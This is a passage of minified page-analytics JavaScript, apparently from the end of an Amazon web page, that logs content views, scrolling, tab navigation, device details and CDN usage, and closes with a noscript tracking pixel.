e=t.selector,n=r[f](e),i=r[a](e),o=i.length-1;0<=o;o--)_.unshift(X(3,{e:i[o],s:t},c));n&&_.unshift(X(3,{e:r,s:t},c))})},w[3]=function(t,e){var n=t.e;K(n)||Y("csa",n,t.s.entity,e)},w[4]=function(){u.register(t,{instance:D})},new k[e](function(t){T(t,u.time(),1)}).observe(U,{childList:!0,subtree:!0}),T(U,u.time(),2),T(null,u.time(),4),u.on("$content.export",function(e){Object.keys(e).forEach(function(t){x[t]=e[t]})}))});csa.plugin(function(o){var i,t="ContentImpressions",e="KillSwitch.",n="IntersectionObserver",r="getAttribute",s="dataset",c="intersectionRatio",a="csaCId",m=1e3,l=o.global,f=o.config,u=f[e+t],v=f[e+t+".ContentViews"],g=((l.performance||{}).timing||{}).navigationStart||o.time(),d={};function h(t){t&&(t.v=1,function(t){t.vt=o.time(),t.el.log({schemaId:"<ns>.ContentView.4",timeToViewed:t.vt-t.el.rt,pageFirstPaintToElementViewed:t.vt-g})}(t))}function I(t){t&&!t.it&&(t.i=o.time()-t.is>m,function(t){t.it=o.time(),t.el.log({schemaId:"<ns>.ContentImpressed.3",timeToImpressed:t.it-t.el.rt,pageFirstPaintToElementImpressed:t.it-g})}(t))}!u&&l[n]&&(i=new l[n](function(t){var n=o.time();t.forEach(function(t){var e=function(t){if(t&&t[r])return d[t[s][a]]}(t.target);if(e){o.emit("$content.intersection",{meta:e.el,t:n,e:t});var i=t.intersectionRect;t.isIntersecting&&0<i.width&&0<i.height&&(v||e.v||h(e),.5<=t[c]&&!e.is&&(e.is=n,e.timer=o.timeout(function(){I(e)},m))),t[c]<.5&&!e.it&&e.timer&&(l.clearTimeout(e.timer),e.is=0,e.timer=0)}})},{threshold:[0,.5,.99]}),o.on("$content.register",function(t){var e=t.el;e&&(d[t.id]={el:t,v:0,i:0,is:0,vt:0,it:0},i.observe(e))}))});csa.plugin(function(e){e.config["KillSwitch.ContentLatency"]||e.emit("$content.export",{mark:function(t,n){var o=this;o.t||(o.t=e("Timers",{logger:o.l,schemaId:"<ns>.ContentLatency.4",logOptions:o.dlo})),o.t("mark",t,n)}})});csa.plugin(function(t){function n(i,e,o){var c={};function r(t,n,e){t in c&&o<=n-c[t].s&&(function(n,e,i){if(!p)return;E(function(t){T(n,t),t.w[n][e]=a((t.w[n][e]||0)+i)})}(t,i,n-c[t].d),c[t].d=n),e||delete c[t]}this.update=function(t,n){n.isIntersecting&&e<=n.intersectionRatio?function(t,n){t in c||(c[t]={s:n,d:n})}(t,u()):r(t,u())},this.stopAll=function(t){var n=u();for(var e in c)r(e,n,t)},this.reset=function(){var t=u();for(var n in c)c[n].s=t,c[n].d=t}}var e=t.config,u=t.time,i="ContentInteractionsSummary",o=e[i+".FlushInterval"]||5e3,c=e[i+".FlushBackoff"]||1.5,r=t.global,s=t.on,a=Math.floor,f=(r.document||{}).documentElement||{},l=((r.performance||{}).timing||{}).responseStart||t.time(),d=o,m=0,p=!0,v=t.UUID(),g=t("Events",{producerId:"csa",lob:e.lob||"0"}),w=new n("it0",0,0),I=new n("it50",.5,1e3),h=new n("it100",.99,0),b={},A={};function $(){w.stopAll(!0),I.stopAll(!0),h.stopAll(!0),S()}function C(){w.reset(),I.reset(),h.reset(),S()}function S(){d&&(clearTimeout(m),m=t.timeout($,d),d*=c)}function U(n){E(function(t){T(n,t),t.w[n].mc=(t.w[n].mc||0)+1})}function E(t){g("log",{messageId:v,schemaId:"<ns>.ContentInteractionsSummary.2",w:{},__merge:t},{ent:{page:["requestId"]}})}function T(t,n){t in n.w||(n.w[t]={})}e["KillSwitch."+i]||(s("$content.intersection",function(t){if(t&&t.meta&&t.e){var n=t.meta.id;if(n in b){var e=t.e.boundingClientRect||{};e.width<5||e.height<5||(w.update(n,t.e),I.update(n,t.e),h.update(n,t.e),!t.e.isIntersecting||n in A||(A[n]=1,function(n,e){E(function(t){T(n,t),t.w[n].ttfv=a(e)})}(n,u()-l)))}}}),s("$content.register",function(t){(t.e||{}).slotId&&(b[t.id]={},function(e){E(function(t){var n=e.id;T(n,t),t.w[n].sid=(e.e||{}).slotId,t.w[n].cid=(e.e||{}).contentId})}(t))}),s("$beforePageTransition",function(){$(),C(),v=t.UUID(),S()}),s("$beforeunload",function(){w.stopAll(),I.stopAll(),h.stopAll(),d=null}),s("$visible",function(t){t?C():($(),clearTimeout(m)),p=t},{buffered:1}),s(f,"click",function(t){for(var n=t.target,e=25;n&&0<e;){var i=(n.dataset||{}).csaCId;i&&U(i),n=n.parentElement,e-=1}},{capture:!0,passive:!0}),S())});csa.plugin(function(d){var t,o,e="normal",c="reload",i="history",s="new-tab",n="ajax",r=1,a=2,u="lastActive",l="lastInteraction",p="used",f="csa-tabbed-browsing",y="visibilityState",g="page",v="experience",b="request",m={"back-memory-cache":1,"tab-switch":1,"history-navigation-page-cache":1},I="<ns>.TabbedBrowsing.4",T="visible",h=d.global,x=d("Events",{producerId:"csa",lob:d.config.lob||"0"}),w=h.location||{},S=h.document,q=h.JSON,P=((h.performance||{}).navigation||{}).type,z=d.store,E=d.on,$=d.storageSupport(),k=!1,A={},C={},O={},j={},B={},J=!1,N=!1,R=!1,D=0;function F(e){try{return q.parse(z(f,void 0,{session:e})||"{}")||{}}catch(e){d.error('Could not parse storage value for key "'+f+'": '+e)}return{}}function G(e,i){z(f,q.stringify(i||{}),{session:e})}function H(e){var i=C.tid||e.id,t=A[u]||{};t.tid===i&&(t.pid=e.id,t.ent=B),j={pid:e.id,tid:i,ent:B,lastInteraction:C[l]||{},initialized:!0},O={lastActive:t,lastInteraction:A[l]||{},time:d.time()}}function K(e){var i=e===s,t=S.referrer,n=!(t&&t.length)||!~t.indexOf(w.origin||""),r=i&&n,a={type:e,toTabId:j.tid,toPageId:j.pid,transitTime:d.time()-A.time||null};r||function(e,i,t){var n=e===c,r=i?A[u]||{}:C,a=A[l]||{},d=C[l]||{},o=i?a:d;t.fromTabId=r.tid,t.fromPageId=r.pid;var s=r.ent||{};s.rid&&(t.fromRequestId=s.rid||null),s.ety&&(t.fromExperienceType=s.ety||null),s.esty&&(t.fromExperienceSubType=s.esty||null),n||!o.id||o[p]||(t.interactionId=o.id||null,o.sid&&(t.interactionSlotId=o.sid||null),a.id===o.id&&(a[p]=!0),d.id===o.id&&(d[p]=!0))}(e,i,a),x("log",{navigation:a,schemaId:I},{ent:{page:["pageType","subPageType","requestId"]}})}function L(e){R=function(e){return e&&e in m}(e.transitionType),function(){A=F(!1),C=F(!0);var e=A[l],i=C[l],t=!1,n=!1;e&&i&&e.id===i.id&&e[p]!==i[p]&&(t=!e[p],n=!i[p],i[p]=e[p]=!0,t&&G(!1,A),n&&G(!0,C))}(),H(e),J=!0,function(e){var i,t;i=Q(),t=U(),(i||t)&&H(e)}(e),D=1}function M(){k&&!R?K(n):(k=!0,K(P===a||R?i:P===r?C.initialized?c:s:C.initialized?e:s))}function Q(){var e=t,i={};return!!(J&&e&&e.e&&e.w)&&(e.w("entities",function(e){i=e||{}}),C[l]={id:e.e.messageId,sid:i.slotId,used:!(A[l]={id:e.e.messageId,sid:i.slotId,used:!1})},!(t=null))}function U(){var e=!1;if(N=S[y]===T,J){var i=A[u]||{};e=function(e,i,t,n){var r=!1,a=e[u];return N?a&&a.tid===j.tid&&a[T]&&a.pid===t||(e[u]={visible:!0,pid:t,tid:i,ent:n},r=!0):a&&a.tid===j.tid&&a[T]&&(r=!(a[T]=!1)),r}(A,C.tid||i.tid||j.tid,C.pid||i.pid||j.pid,C.ent||i.ent||j.ent)}return e}$.local&&$.session&&q&&S&&y in S&&(o=function(){try{return h.self!==h.top}catch(e){return!0}}(),E("$entities.set",function(e){if(!o&&e){var i=(e[b]||{}).id||(e[g]||{}).requestId,t=(e[v]||{}).experienceType||(e[g]||{}).pageType,n=(e[v]||{}).experienceSubType||(e[g]||{}).subPageType,r=!B.rid&&i||!B.ety&&t||!B.esty&&n;if(B.rid=B.rid||i,B.ety=B.ety||t,B.esty=B.esty||n,r&&D){var a=A[u]||{};a.tid===C.tid&&(a.ent=B,G(!1,A)),C.ent=B,G(!0,C)}}},{buffered:1}),E("$pageChange",function(e){o||(L(e),M(),G(!1,O),G(!0,j),C=j,A=O)},{buffered:1}),E("$content.interaction",function(e){t=e,Q()&&(G(!1,A),G(!0,C))}),E(S,"visibilitychange",function(){!o&&U()&&G(!1,A)},{capture:!1,passive:!0}))});csa.plugin(function(c){var e=c("Metrics",{producerId:"csa"});c.on(c.global,"pageshow",function(c){c&&c.persisted&&e("recordMetric","bfCache",1)})});csa.plugin(function(n){var e,t,i,o,r,a,c,u,f,s,l,d,p,g,m,v,h,b,y="hasFocus",S="$app.",T="avail",$="client",w="document",I="inner",P="offset",D="screen",C="scroll",E="Width",F="Height",O=T+E,q=T+F,x=$+E,z=$+F,H=I+E,K=I+F,M=P+E,W=P+F,X=C+E,Y=C+F,j="up",k="down",A="none",B=20,G=n.config,J=G["KillSwitch.PageInteractionsSummary"],L=n("Events",{producerId:"csa",lob:G.lob||"0"}),N=1,Q=n.global||{},R=n.time,U=n.on,V=n.once,Z=Q[w]||{},_=Q[D]||{},nn=Q.Math||{},en=nn.abs,tn=nn.max,on=nn.ceil,rn=((Q.performance||{}).timing||{}).responseStart,an=function(){return Z[y]()},cn=1,un=100,fn={},sn=1,ln=0,dn=0,pn=k,gn=A;function mn(){c=t=o=r=e,i=d=0,a=u=f=s=l=0,pn=k,gn=A,dn=ln=0,yn(),bn()}function vn(){rn&&!o&&(c=on((o=p)-rn),sn=1)}function hn(){var n=m-i;(!t||t&&t<=p)&&(n&&(++a,sn=dn=1),i=m,n),function(){if(gn=d<m?k:j,pn!==gn){var n=en(m-d);B<n&&(++l,ln&&!dn&&++a,pn=gn,sn=ln=1,d=m,dn=0)}else dn=0,d=m}(),t=p+un}function bn(){u=on(tn(u,m+b)),g&&(f=on(tn(f,g+h))),sn=1}function yn(){p=R(),g=en(Q.pageXOffset||0),m=tn(Q.pageYOffset||0,0),v=0<g||0<m,h=Q[H]||0,b=Q[K]||0}function Sn(){yn(),vn(),hn(),bn()}function Tn(){if(r){var n=on(R()-r);s+=n,r=e,sn=0<n}}function $n(){r=r||R()}function wn(n,e,t,i){e[n+E]=on(t||0),e[n+F]=on(i||0)}function In(n){var e=n===fn,t=an();if(t||sn){if(!e){if(!N)return;N=0,t&&Tn()}var i=function(){var n={},e=Z.documentElement||{},t=Z.body||{};return wn("availableScreen",n,_[O],_[q]),wn(w,n,tn(t[X]||0,t[M]||0,e[x]||0,e[X]||0,e[M]||0),tn(t[Y]||0,t[W]||0,e[z]||0,e[Y]||0,e[W]||0)),wn(D,n,_.width,_.height),wn("viewport",n,Q[H],Q[K]),n}(),o=function(){var n={scrollCounts:a,reachedDepth:u,horizontalScrollDistance:f,dwellTime:s,vScrollDirChanges:l};return"number"==typeof c&&(n.clientTimeToFirstScroll=c),n}();e?sn=0:(mn(),rn=R(),t&&(r=rn)),L("log",{activity:o,dimensions:i,schemaId:"<ns>.PageInteractionsSummary.3"},{ent:{page:["pageType","subPageType","requestId"]}})}}function Pn(){Tn(),In(fn)}function Dn(n,e){return function(){cn=e,n()}}function Cn(){an=function(){return cn},cn&&!r&&(r=R())}"function"!=typeof Z[y]||J||(mn(),v&&vn(),U(Q,C,Sn,{passive:!0}),U(Q,"blur",Pn),U(Q,"focus",Dn($n,1)),V(S+"android",Cn),V(S+"ios",Cn),U(S+"pause",Dn(Pn,0)),U(S+"resume",Dn($n,1)),U(S+"resign",Dn(Pn,0)),U(S+"active",Dn($n,1)),an()&&(r=rn||R()),V("$beforeunload",In),U("$beforeunload",In),U("$document.hidden",Pn),U("$beforePageTransition",In),U("$afterPageTransition",function(){sn=N=1}))});csa.plugin(function(e){var o,n,r="<ns>.Navigator.5",a=e.global,i=a.navigator||{},d=i.connection||{},c=a.Math.round,t=e("Events",{producerId:"csa",lob:e.config.lob||"0"});function l(){o={network:{downlink:void 0,downlinkMax:void 0,rtt:void 0,type:void 0,effectiveType:void 0,saveData:void 0},language:void 0,doNotTrack:void 0,hardwareConcurrency:void 0,deviceMemory:void 0,cookieEnabled:void 0,webdriver:void 0},v(),o.language=i.language||null,o.doNotTrack=function(){switch(i.doNotTrack){case"1":return"enabled";case"0":return"disabled";case"unspecified":return i.doNotTrack;default:return null}}(),o.hardwareConcurrency="hardwareConcurrency"in i?c(i.hardwareConcurrency||0):null,o.deviceMemory="deviceMemory"in i?c(i.deviceMemory||0):null,o.cookieEnabled="cookieEnabled"in i?i.cookieEnabled:null,o.webdriver="webdriver"in i?i.webdriver:null}function u(){t("log",{network:(n={},Object.keys(o.network).forEach(function(e){n[e]=o.network[e]+""}),n),language:o.language,doNotTrack:o.doNotTrack,hardwareConcurrency:o.hardwareConcurrency,deviceMemory:o.deviceMemory,cookieEnabled:o.cookieEnabled,webdriver:o.webdriver,schemaId:r},{ent:{page:["pageType","subPageType","requestId"]}})}function v(){!function(n){Object.keys(o.network).forEach(function(e){o.network[e]=n[e]})}({downlink:"downlink"in d?c(d.downlink||0):null,downlinkMax:"downlinkMax"in d?c(d.downlinkMax||0):null,rtt:"rtt"in d?(d.rtt||0).toFixed():null,type:d.type||null,effectiveType:d.effectiveType||null,saveData:"saveData"in d?d.saveData:null})}function k(){v(),u()}function w(){l(),u()}l(),u(),e.on("$afterPageTransition",w),e.on(d,"change",k)});


ue.exec(function(d,c){function g(e,c){e&&ue.tag(e+c);return!!e}function n(){for(var e=RegExp("^https://(.*\.(images|ssl-images|media)-amazon\.com|"+c.location.hostname+")/images/","i"),d={},h=0,k=c.performance.getEntriesByType("resource"),l=!1,b,a,m,f=0;f<k.length;f++)if(a=k[f],0<a.transferSize&&a.transferSize>=a.encodedBodySize&&(b=e.exec(String(a.name)))&&3===b.length){a:{b=a.serverTiming||[];for(a=0;a<b.length;a++)if("provider"===b[a].name){b=b[a].description;break a}b=void 0}b&&(l||(l=g(b,"_cdn_fr")),
a=d[b]=(d[b]||0)+1,a>h&&(m=b,h=a))}g(m,"_cdn_mp")}d.ue&&"function"===typeof d.ue.tag&&c.performance&&c.location&&n()},"cdnTagging")(ue_csm,window);


}

/* ◬ */
</script>

</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:146-6396924-6979746:XFZ3XQPHWBKQ5E43HWCN$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DXFZ3XQPHWBKQ5E43HWCN:0' alt=""/>
</noscript>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 49542)</script></body>
</html>
